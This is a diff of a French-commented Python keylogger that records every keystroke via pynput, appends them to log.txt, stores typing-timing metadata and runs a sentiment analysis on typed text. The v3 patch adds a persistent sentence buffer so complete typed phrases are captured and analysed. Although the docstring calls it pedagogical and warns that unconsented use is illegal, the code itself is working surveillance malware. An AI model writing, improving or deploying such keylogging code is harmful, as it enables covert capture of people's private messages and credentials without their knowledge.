@@ -12,6 +12,15 @@ CORRECTIFS v2 :
     ✅ THREAD-SAFE — lock sur le buffer avant chaque flush.
     ✅ MÉTADONNÉES — sauvegarde continue dans metadata.json.
 
+CORRECTIF v3 :
+    ✅ BUFFER DE PHRASES PERSISTANT — résout le bug où les phrases de 3+ mots
+       n'apparaissaient jamais dans le graphique "Évolution des sentiments".
+       Cause racine : le flush de 10s coupait les phrases en plein milieu
+       (ex: "ils sont" → 2 mots → trop_court, "tous parti" → 2 mots → trop_court).
+       Solution : _sentence_buffer accumule le texte ENTRE les flushes.
+       L'analyse est déclenchée immédiatement sur appui Enter (phrase complète)
+       ET sur chaque flush si le buffer contient ≥ MIN_WORDS_FOR_ANALYSIS mots.
+
 ⚠️  USAGE ÉTHIQUE UNIQUEMENT — cadre pédagogique.
     Toute utilisation sans consentement explicite est illégale (RGPD, Loi Godfrain).
 """
@@ -38,6 +47,15 @@ log: str = ""
 last_key_time: float = time.time()
 keystroke_metadata: list = []
 _buffer_lock = threading.Lock()
+
+# ── Buffer de phrases persistant (CORRECTIF v3) ───────────────────────────────
+# Accumule le texte ENTRE les flushes pour ne jamais couper une phrase en deux.
+# Réinitialisé uniquement quand on déclenche une analyse (Enter ou seuil atteint).
+_sentence_buffer: str = ""
+_sentence_buffer_lock = threading.Lock()
+
+# Nombre de mots minimum dans _sentence_buffer pour déclencher une analyse sur flush
+MIN_WORDS_FOR_ANALYSIS = 3
 
 # ── Pipeline IA (chargé une fois au démarrage) ────────────────────────────────
 _ml_model  = None
@@ -137,7 +155,7 @@ def _fix_azerty_digit(key) -> str | None:
 
 def processkeys(key) -> None:
     """Callback pynput — appelé à chaque appui de touche."""
-    global log, last_key_time
+    global log, last_key_time, _sentence_buffer
 
     now             = time.time()
     inter_key_delay = round(now - last_key_time, 4)
@@ -156,18 +174,42 @@ def processkeys(key) -> None:
             char_logged = raw_char
             log += raw_char
 
+        # Alimenter le buffer de phrases (CORRECTIF v3)
+        with _sentence_buffer_lock:
+            _sentence_buffer += raw_char if fixed is None else fixed
+
     except AttributeError:
         # Touche spéciale (Key.space, Key.enter, etc.)
         if key == keyboard.Key.space:
             char_logged = " "
             log += " "
+            with _sentence_buffer_lock:
+                _sentence_buffer += " "
+
         elif key == keyboard.Key.enter:
             char_logged = "\n"
             log += "\n"
+            # ── CORRECTIF v3 : Enter = fin de phrase → analyser immédiatement ──
+            with _sentence_buffer_lock:
+                phrase = _sentence_buffer.strip()
+                _sentence_buffer = ""   # Vider pour la prochaine phrase
+
+            if phrase and len(phrase.split()) >= MIN_WORDS_FOR_ANALYSIS:
+                threading.Thread(
+                    target=_run_analysis,
+                    args=(phrase,),
+                    daemon=True,
+                    name="AI-Enter-Analysis"
+                ).start()
+
         elif key == keyboard.Key.backspace:
             char_logged = "[BACK]"
             if log:
                 log = log[:-1]
+            with _sentence_buffer_lock:
+                if _sentence_buffer:
+                    _sentence_buffer = _sentence_buffer[:-1]
+
         elif key == keyboard.Key.tab:
             char_logged = "\t"
             log += "\t"
@@ -275,18 +317,19 @@ def report(interval: int = 10) -> None:
     """
     Flush le buffer toutes les `interval` secondes :
       1. Écrit dans log.txt (mode append)
-      2. Lance l'analyse IA en arrière-plan
+      2. Lance l'analyse IA sur _sentence_buffer si ≥ MIN_WORDS_FOR_ANALYSIS mots
+         (CORRECTIF v3 : évite de couper les phrases en milieu de flush)
       3. Sauvegarde les métadonnées de frappe
     """
-    global log, keystroke_metadata
+    global log, keystroke_metadata, _sentence_buffer
 
     DATA.mkdir(exist_ok=True)
 
-    # ── Capture atomique du buffer ─────────────────────────────────────────
+    # ── Capture atomique du buffer de touches ──────────────────────────────
     with _buffer_lock:
-        current_log      = log
-        current_meta     = keystroke_metadata.copy()
-        log              = ""
+        current_log  = log
+        current_meta = keystroke_metadata.copy()
+        log          = ""
         keystroke_metadata.clear()
 
     # ── Écriture log.txt ───────────────────────────────────────────────────
@@ -298,10 +341,22 @@ def report(interval: int = 10) -> None:
         except IOError as e:
             print(f"[ERREUR log] {e}")
 
-        # Analyse IA en arrière-plan (non bloquant)
+    # ── CORRECTIF v3 : analyser _sentence_buffer si seuil atteint ─────────
+    # On ne vide le buffer QUE si on a assez de mots pour une analyse valide.
+    # Sinon on garde l'accumulation pour le prochain flush.
+    with _sentence_buffer_lock:
+        buffered_text  = _sentence_buffer.strip()
+        word_count     = len(buffered_text.split()) if buffered_text else 0
+        if word_count >= MIN_WORDS_FOR_ANALYSIS:
+            text_to_analyse = buffered_text
+            _sentence_buffer = ""   # Consommer le buffer
+        else:
+            text_to_analyse = None  # Pas assez de mots → garder pour plus tard
+
+    if text_to_analyse:
         threading.Thread(
             target=_run_analysis,
-            args=(current_log,),
+            args=(text_to_analyse,),
             daemon=True,
             name="AI-Analysis"
         ).start()
